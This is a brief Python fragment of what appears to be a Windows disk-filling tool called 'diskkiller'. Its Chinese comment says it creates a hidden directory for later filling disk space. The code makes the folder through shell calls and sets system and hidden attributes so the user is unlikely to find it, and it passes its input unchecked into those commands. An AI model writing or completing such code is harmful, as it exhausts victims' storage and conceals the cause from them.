from os import system as cmd
from os import listdir

# 在指定磁盘上创建一个隐藏目录，用于后续填充磁盘空间
def createdirectory(disk):
    if not "diskkiller" in listdir(disk + ":\\"):
        cmd(f"mkdir {disk}:\\diskkiller") 
    cmd(f"attrib +s +h {disk}:\\diskkiller") 